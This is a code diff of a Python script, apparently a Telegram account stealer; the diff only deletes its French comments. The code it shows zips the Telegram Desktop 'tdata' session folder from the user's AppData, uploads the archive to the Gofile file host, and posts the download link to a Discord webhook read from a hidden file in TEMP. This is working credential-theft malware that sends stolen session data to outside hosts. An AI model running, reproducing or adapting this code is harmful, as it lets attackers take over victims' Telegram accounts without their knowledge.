@@ -5,15 +5,12 @@ import shutil
 import tempfile
 import zipfile
 
-# Chemin du dossier Telegram tdata
 tdata_path = os.path.join(os.getenv("APPDATA"), "Telegram Desktop", "tdata")
 
-# Vérification de l'existence du dossier
 if not os.path.exists(tdata_path):
     print("Le dossier tdata est introuvable.")
     exit()
 
-# Création d'un fichier ZIP temporaire
 temp_dir = tempfile.gettempdir()
 zip_path = os.path.join(temp_dir, "tdata.zip")
 
@@ -26,7 +23,6 @@ with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zipf:
 
 print(f"Dossier tdata zippé : {zip_path}")
 
-# Récupération d'un serveur Gofile
 server_response = requests.get("https://api.gofile.io/servers")
 server_data = server_response.json()
 
@@ -37,7 +33,6 @@ if server_data["status"] != "ok":
 server_name = server_data["data"]["servers"][0]["name"]
 print(f"Serveur sélectionné : {server_name}")
 
-# Envoi du fichier sur Gofile
 with open(zip_path, "rb") as file:
     files = {"file": file}
     upload_response = requests.post(f"https://{server_name}.gofile.io/contents/uploadfile", files=files)
@@ -51,14 +46,12 @@ if upload_data["status"] != "ok":
 file_link = upload_data["data"]["downloadPage"]
 print(f"Fichier envoyé avec succès : {file_link}")
 
-# Lecture du webhook depuis le fichier
 webhook_path = os.path.join(os.getenv("TEMP"), "config", "webhook.txt")
 
 if os.path.exists(webhook_path):
     with open(webhook_path, "r") as f:
         webhook_url = f.read().strip()
 
-    # Envoi du message sur Discord
     payload = {"content": f"📂 Fichier uploadé : {file_link}"}
     response_discord = requests.post(webhook_url, json=payload)
 
